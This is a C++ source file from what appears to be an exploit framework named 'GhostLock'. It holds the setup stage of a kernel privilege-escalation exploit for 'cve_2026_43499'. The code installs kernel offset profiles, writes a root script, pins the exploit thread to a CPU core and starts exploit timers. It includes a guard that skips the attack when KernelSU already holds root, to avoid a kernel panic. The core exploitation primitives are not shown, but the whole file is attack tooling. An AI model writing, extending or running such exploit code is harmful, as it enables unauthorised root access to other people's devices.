/*
 * GhostLock — cve_2026_43499 backend procedure (Batch 4, D1=B slice 3a).
 *
 * The setup stage moved out of ExploitProcedure; the body is unchanged except
 * for using the ExploitSession parameter and the passed-in force_attack flag.
 */

#include "session/backend/cve_2026_43499_backend.hpp"

#include "attack/ops.hpp"
#include "common.h"
#include "kernel/target.h"
#include "kernelsnitch/utils.h"
#include "route/route_api.hpp"
#include "session/handoff_probe.hpp"
#include "support/decls.hpp"
#include "support/fatal_error.hpp"

#include <unistd.h>

#include <cstdint>

namespace ghostlock::session::backend {
    /* Stage: process setup and profile installation. */
    StageResult run_setup(ExploitSession &session, const profile::kernel_offsets &decoded,
                          const char *debug_dir, bool force_attack) {
        session.heap.init();
        support::disable_rseq_for_thread();
        kernel::set_unbuffer();
        signal(SIGPIPE, SIG_IGN);
        kernel::set_limit();
        route::reserve_standard_io();
        if (config::runtime_config_snapshot().init() != 0) {
            pr_error("runtime configuration failed errno=%d\n", errno);
            throw FatalError{};
        }
        if (debug_dir && debug_dir[0])
            config::runtime_config_snapshot().debug_dir = debug_dir;
        if (!session.profile.loaded())
            attack::install_profile(decoded);
        /* Robustness guard: running the attack where KernelSU already owns root
         * drives the re-enforce path that panics the kernel at the first PI
         * route, and the objective is already met. Bail out cleanly instead; a
         * cold boot clears the module for a real run. The forced test skips
         * this check on purpose and relies on the root script discarding the
         * child. */
        if (!force_attack && ksu_root_owned()) {
            pr_warning("KernelSU already has root; skipping exploit "
                "(cold boot for a clean run, or enable the forced test)\n");
            return StageResult::Done;
        }
        attack::write_root_script();

        attack::apply_iomem_cache();
        support::log_startup_context();
        support::init_p0_profile();
        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
        pr_info("main thread running on cpu=%d\n", sched_getcpu());

        attack::timer_reset();
        attack::timer_mark("exploit start");
        return StageResult::Continue;
    }
} // namespace ghostlock::session::backend
